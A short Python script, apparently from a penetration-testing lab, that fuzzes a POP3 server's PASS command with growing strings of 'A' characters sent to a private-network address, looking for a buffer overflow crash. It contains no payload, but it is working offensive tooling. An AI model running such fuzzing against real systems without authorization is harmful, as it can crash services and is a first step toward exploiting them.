#!/usr/bin/python

import socket

buff = ["A"]
counter = 100

while len(buff) <= 30:
   buff.append("A"*counter)
   counter+=200

for string in buff:
   print("Fussing PASS with %s bytes" % len(string))
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect( ("10.11.14.166",110) )
   print(s.recv(1024))
   s.send("USER test\r\n")
   print(s.recv(1024))
   passw = "PASS " + string + "\r\n"
   s.send(passw)
   s.send("QUIT\r\n")
   s.close()
